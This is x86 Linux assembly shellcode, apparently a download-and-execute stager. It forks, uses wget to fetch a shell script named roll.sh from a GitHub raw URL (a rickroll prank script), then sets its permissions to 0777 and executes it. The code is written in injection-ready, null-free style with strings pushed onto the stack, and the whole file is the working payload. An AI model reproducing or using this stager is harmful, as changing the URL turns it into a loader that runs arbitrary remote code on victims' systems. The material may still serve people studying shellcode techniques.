global _start

section .text

_start:

    ;fork
    xor eax,eax
    mov al,0x2
    int 0x80
    xor ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    xor eax,eax
    mov al,0x7
    int 0x80
        
    ;chmod roll.sh
    xor ecx,ecx
    xor eax, eax
    push eax
    mov al, 0xf
    push 0x68732e
    push 0x6c6c6f72
    mov ebx, esp
    xor ecx, ecx
    mov cx, 0x1ff
    int 0x80
    
    ;exec roll.sh
    xor eax, eax
    push eax
    push 0x68732e
    push 0x6c6c6f72
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80

child:
    push 0xb
    pop eax
    cdq
    push edx
    ; https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh 
    push 0x6873
    push 0x2e6c6c6f
    push 0x722f7265
    push 0x7473616d
    push 0x2f63726c
    push 0x6c6f726b
    push 0x6369722f
    push 0x656e6572
    push 0x65736f72
    push 0x656b2f6d
    push 0x6f632e74
    push 0x6e65746e
    push 0x6f637265
    push 0x73756275
    push 0x68746967
    push 0x2e776172
    push 0x2f2f3a73
    push 0x70747468
   
    mov ecx,esp
    push edx
   
    ; wget 
    push 0x74 
    push 0x6567772f 
    push 0x6e69622f 
    push 0x7273752f
    ;push 0x7273752f 
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
